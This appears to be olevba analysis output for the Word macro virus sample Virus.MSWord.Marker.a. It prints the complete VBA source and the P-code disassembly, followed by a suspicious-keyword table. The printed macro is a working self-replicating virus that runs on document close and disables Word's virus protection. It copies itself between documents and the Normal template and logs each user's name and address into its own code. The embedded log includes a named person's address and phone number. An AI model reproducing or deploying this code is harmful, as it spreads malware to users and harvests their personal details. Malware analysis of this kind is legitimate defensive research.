olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"
Const ExportFile = "c:\netldv.vxd"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim UserAddress As String


'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    ad.Export ExportFile                    'Export from the ActiveDocument

    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    Open ExportFile For Append As #1
    Print #1, "' " & Format(Time, "hh:mm:ss AMPM - ") & _
              Format(Date, "dddd, d mmm yyyy") & _
              Chr(13) & "' " & Application.UserName & _
              Chr(13) & "' " & UserAddress
    Close #1
    
    
    nt.CodeModule.AddFromFile ExportFile    'Import into the NormalTemplate
    nt.CodeModule.DeleteLines 1, 4          'Remove some unnessesary lines
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    nt.Export ExportFile                    'Export from the NormalTemplate
    ad.CodeModule.AddFromFile ExportFile    'Import into the ActiveDocument
    ad.CodeModule.DeleteLines 1, 4          'Remove some unnessesary lines
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
    
    
  Kill ExportFile                           'Delete the file which
                                            'stores the virus's
                                            'source code

End If

End Sub

' 08:26:42  - Sonntag, 22 Nov 1998
' SPo0Ky
' Blue Planet





' 05:35:04  - Freitag, 22 Okt 1999
' Alex Muffat
' 1140 Wien
' Teststrasse 40/30/10
' Tel: 12345473434


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5864 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x0014 "<- this is a marker!"
' 	VarDefn Marker
' Line #5:
' 	Dim (Const) 
' 	LitStr 0x000D "c:\netldv.vxd"
' 	VarDefn ExportFile
' Line #6:
' Line #7:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #8:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #10:
' 	Dim 
' 	VarDefn UserAddress (As String)
' Line #11:
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #16:
' Line #17:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #18:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #19:
' Line #20:
' Line #21:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #23:
' Line #24:
' Line #25:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #26:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #27:
' Line #28:
' Line #29:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #30:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #31:
' Line #32:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #33:
' Line #34:
' 	Ld ExportFile 
' 	Ld ad 
' 	ArgsMemCall Export 0x0001 
' 	QuoteRem 0x002C 0x001E "Export from the ActiveDocument"
' Line #35:
' Line #36:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #38:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #39:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #40:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	ElseBlock 
' Line #43:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' Line #47:
' 	Ld ExportFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #48:
' 	LineCont 0x000C 0D 00 0E 00 14 00 0E 00 1F 00 0E 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "' "
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #50:
' Line #51:
' Line #52:
' 	Ld ExportFile 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' 	QuoteRem 0x002C 0x001E "Import into the NormalTemplate"
' Line #53:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	QuoteRem 0x002C 0x001D "Remove some unnessesary lines"
' Line #54:
' Line #55:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #56:
' Line #57:
' 	EndIfBlock 
' Line #58:
' Line #59:
' Line #60:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #61:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #62:
' Line #63:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #64:
' Line #65:
' 	Ld ExportFile 
' 	Ld nt 
' 	ArgsMemCall Export 0x0001 
' 	QuoteRem 0x002C 0x001E "Export from the NormalTemplate"
' Line #66:
' 	Ld ExportFile 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' 	QuoteRem 0x002C 0x001E "Import into the ActiveDocument"
' Line #67:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	QuoteRem 0x002C 0x001D "Remove some unnessesary lines"
' Line #68:
' Line #69:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #70:
' Line #71:
' 	EndIfBlock 
' Line #72:
' Line #73:
' Line #74:
' 	Ld ExportFile 
' 	ArgsCall Kill 0x0001 
' 	QuoteRem 0x002C 0x0015 "Delete the file which"
' Line #75:
' 	QuoteRem 0x002C 0x0012 "stores the virus's"
' Line #76:
' 	QuoteRem 0x002C 0x000B "source code"
' Line #77:
' Line #78:
' 	EndIfBlock 
' Line #79:
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' 	QuoteRem 0x0000 0x0021 " 08:26:42  - Sonntag, 22 Nov 1998"
' Line #83:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #84:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' 	QuoteRem 0x0000 0x0021 " 05:35:04  - Freitag, 22 Okt 1999"
' Line #91:
' 	QuoteRem 0x0000 0x000C " Alex Muffat"
' Line #92:
' 	QuoteRem 0x0000 0x000A " 1140 Wien"
' Line #93:
' 	QuoteRem 0x0000 0x0015 " Teststrasse 40/30/10"
' Line #94:
' 	QuoteRem 0x0000 0x0011 " Tel: 12345473434"
' Line #95:
' Line #96:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

